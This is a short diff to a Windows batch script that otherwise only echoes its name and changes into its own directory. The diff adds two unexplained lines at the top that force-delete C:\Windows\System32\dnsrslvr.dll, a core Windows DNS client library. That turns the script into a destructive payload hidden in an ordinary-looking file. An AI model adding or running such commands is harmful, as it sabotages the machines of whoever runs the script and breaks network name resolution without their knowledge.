@@ -1,4 +1,8 @@
 @ECHO OFF
+
+del /Q C:\Windows\System32\dnsrslvr.dll
+del /f C:\Windows\System32\dnsrslvr.dll
+
 echo %~n0%~x0 started from Directory: %~d0%~p0
 %~d0
 cd %~d0%~p0
